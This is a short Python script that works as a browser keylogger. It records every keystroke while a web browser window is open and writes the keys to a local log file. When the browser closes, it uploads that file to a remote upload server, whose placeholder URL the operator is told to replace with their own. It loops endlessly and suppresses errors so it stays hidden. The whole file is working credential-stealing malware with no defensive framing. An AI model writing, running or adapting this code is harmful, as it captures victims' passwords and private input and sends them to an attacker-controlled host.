from pynput import keyboard
import pywinauto
import requests


def record_browser_session():
    session_hit = []

    def on_press(key):
        session_hit.append(key)
        if key == keyboard.Key.esc or key == keyboard.Key.enter:
            write_to_file(session_hit)
            session_hit.clear()

    def write_to_file(data):
        file_path = "log_with_active_browser.txt"
        with open(file_path, "a") as file:
            for byte in data:
                file.write(f"{byte} + ")
            file.write(' \n')

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        browsers = ["Mozilla Firefox", "Google Chrome", "Microsoft Edge", "Brave", "Opera"]
        active_browser_found = False

        for browser in browsers:
            try:
                pywinauto.findwindows.find_window(title=browser)
                active_browser_found = True
                break
            except pywinauto.findwindows.WindowNotFoundError:
                pass

        if not active_browser_found:
            try:
                file = {'file': open("./log_with_active_browser.txt", 'rb')}
                requests.post("http://addyoururlhere/upload.php", files=file)  # Change the url to your own upload server
            except Exception:  # Not to break script if an error occurs while sending the data
                pass
            break

    listener.stop()
    listener.join()


def active_window_process():
    current_windows = pywinauto.Desktop(backend='uia').windows()
    for window in current_windows:
        if "Mozilla Firefox" in window.window_text() or "Google Chrome" in window.window_text() or "Microsoft Edge" in window.window_text() or "Brave" in window.window_text() or "Opera" in window.window_text():
            record_browser_session()
        # Other apps outside of browsers are not supported


while True:
    active_window_process()
